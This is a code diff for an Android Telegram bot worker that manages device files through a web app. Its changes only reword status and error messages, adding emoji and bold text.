@@ -106,7 +106,7 @@ public class TelegramBotWorker implements Runnable {
                 case "fm_init":
                     String rootUriStr = prefs.getString("saf_root_uri", null);
                     if (rootUriStr == null) {
-                        sendWebAppUpdate(new JSONObject().put("error", "Access not granted. Please request access from the Web App.").toString(), "File Manager needs setup");
+                        sendWebAppUpdate(new JSONObject().put("error", "grant_needed").toString(), "❗️ Action Required");
                     } else {
                         prefs.edit().putString("saf_current_uri", rootUriStr).apply();
                         handleWebAppListFiles(rootUriStr);
@@ -129,7 +129,7 @@ public class TelegramBotWorker implements Runnable {
                 case "fm_delete_file":
                     Uri fileToDeleteUri = Uri.parse(jsonData.getString("uri"));
                     boolean success = FileManager.deleteFile(context, fileToDeleteUri);
-                    String msg = success ? "File deleted successfully." : "Failed to delete file.";
+                    String msg = success ? "✅ File deleted successfully." : "❌ Failed to delete file.";
                     sendMessage(msg, context);
                     String currentUri = prefs.getString("saf_current_uri", null);
                     if (currentUri != null) handleWebAppListFiles(currentUri);
@@ -163,7 +163,7 @@ public class TelegramBotWorker implements Runnable {
                 }
                 response.put("items", itemsArray);
             }
-            sendWebAppUpdate(response.toString(), "File list updated");
+            sendWebAppUpdate(response.toString(), "✅ **Ready! Click below to view files.**");
         } catch (Exception e) {
             ErrorLogger.logError(context, "handleWebAppListFiles", e);
         }
